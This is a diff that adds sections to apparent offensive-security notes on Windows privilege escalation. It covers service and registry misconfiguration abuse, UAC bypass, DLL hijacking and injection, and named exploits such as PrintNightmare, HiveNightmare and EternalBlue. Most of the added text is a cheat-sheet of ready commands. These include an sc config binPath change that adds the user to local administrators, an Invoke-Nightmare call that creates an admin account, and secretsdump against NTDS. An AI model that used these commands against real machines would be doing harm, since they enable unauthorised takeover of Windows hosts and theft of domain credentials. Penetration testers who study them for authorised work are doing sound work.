@@ -93,6 +93,35 @@ secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
 
 > Always run `whoami /groups`. These "weak" admin-adjacent groups (Backup Operators, DnsAdmins, Server Operators) are frequently handed out and each is a clean path to DA/SYSTEM — defenders forget they're nearly as powerful as Domain Admins.
 
+## Service & permission misconfigurations (the classics)
+Services run as SYSTEM, so controlling one = SYSTEM. Auto-detect with **SharpUp audit** / **PowerUp Invoke-AllChecks** / **winPEAS**, then:
+
+| Misconfig | Check | Abuse |
+|---|---|---|
+| **Weak service perms** (SERVICE_CHANGE_CONFIG) | `accesschk.exe -quvcw <svc>` | `sc config <svc> binPath= "cmd /c net localgroup administrators <me> /add"` then `sc stop/start <svc>`, restore binPath after |
+| **Writable service binary** (file ACL) | `icacls "<svc>.exe"` | replace the exe with your own, `sc start <svc>` |
+| **Unquoted service path** | `wmic service get name,pathname,startmode` (look for auto-start paths with spaces and no quotes, outside C:\Windows) | drop `C:\Program.exe` in an unquoted `C:\Program Files\...` path |
+| **Writable registry service key** | `accesschk.exe -kvuqsw hklm\System\CurrentControlSet\services` | `Set-ItemProperty ...\<svc> -Name ImagePath -Value <your binary>` |
+| **Modifiable autorun** | `Get-CimInstance Win32_StartupCommand` | replace a startup binary you can write |
+
+(Reverse-shell payloads not stored; the add-admin / binary-replace mechanism is the point. Always restore the original binPath/config afterward.)
+
+## UAC bypass & DLL attacks
+- **UAC** separates standard vs admin tokens; it is a convenience, not a security boundary. Check: `REG QUERY HKLM\...\System /v EnableLUA` and `ConsentPromptBehaviorAdmin`.
+- **Auto-elevating binaries** (e.g. `SystemPropertiesAdvanced.exe`, fodhelper) + **DLL hijacking**: drop a malicious DLL in a path the trusted binary searches (abusing the DLL search order) so it loads elevated. Find missing DLLs with **Process Monitor**. UAC bypass choice depends on the Windows build.
+- **DLL injection** (into a privileged process): OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread/LoadLibrary. Variants: manual mapping, reflective (loads from memory, evades LoadLibrary hooks), DLL proxying. Mostly maldev/EDR-evasion territory.
+
+## Windows named exploits (reference)
+Fingerprint with `systeminfo` / `wmic qfe` / `Get-HotFix`, then match:
+| Exploit | CVE | Effect |
+|---|---|---|
+| **HiveNightmare/SeriousSAM** | CVE-2021-36934 | readable SAM/SYSTEM/SECURITY shadow copies -> local hashes (`HiveNightmare.exe` -> secretsdump) |
+| **PrintNightmare** | CVE-2021-1675 / 34527 | spooler RCE/privesc; `Invoke-Nightmare -NewUser <u> -NewPassword <p>` adds local admin |
+| **EternalBlue** | MS17-010 | SMBv1 RCE (remote, not just local) |
+| **Service Tracing** | CVE-2020-0668 | arbitrary file move as SYSTEM -> replace a service binary |
+| **PrintSpoofer/potato** | - | SeImpersonate -> SYSTEM (above) |
+Check spooler is up for PrintNightmare: `ls \\localhost\pipe\spoolss`.
+
 ## Credential dumping
 ```text
 # LSASS (plaintext creds / NTLM hashes) - needs admin/SeDebug
